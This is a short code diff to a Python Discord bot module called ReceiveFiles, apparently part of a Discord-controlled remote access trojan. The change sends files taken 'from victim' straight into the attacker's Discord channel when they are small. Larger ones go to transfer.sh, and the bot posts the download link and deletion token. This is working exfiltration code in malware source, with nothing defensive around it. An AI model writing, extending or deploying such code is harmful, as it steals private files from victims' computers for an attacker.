@@ -35,15 +35,29 @@ class ReceiveFiles(commands.Cog):
                     )
                 )
             
+            if os.path.getsize(file_path) < 8388608:
+                return await ctx.followup.send(
+                    embed = self.bot.genEmbed(
+                        "Received file from victim",
+                        datetime.now()
+                    ),
+                    file = discord.File(
+                        file_path
+                    )
+                )
+            
             file = {'{}'.format(file_path): f}
             response = requests.post('https://transfer.sh/', files=file)
             download_link = response.content.decode('utf-8')
-
+            deletion_token = response.headers.get("X-Url-Delete")
+            
+            deletion_token = deletion_token.replace(download_link.rstrip()+'/','')
+            
             await ctx.followup.send(
                 embed=self.bot.genEmbed(
                     "Received file from victim",
                     datetime.now(),
-                    "Link:\n" + download_link
+                    "Link:\n" + download_link + "\nDeletion token:\n" + deletion_token
                 )
             )
             
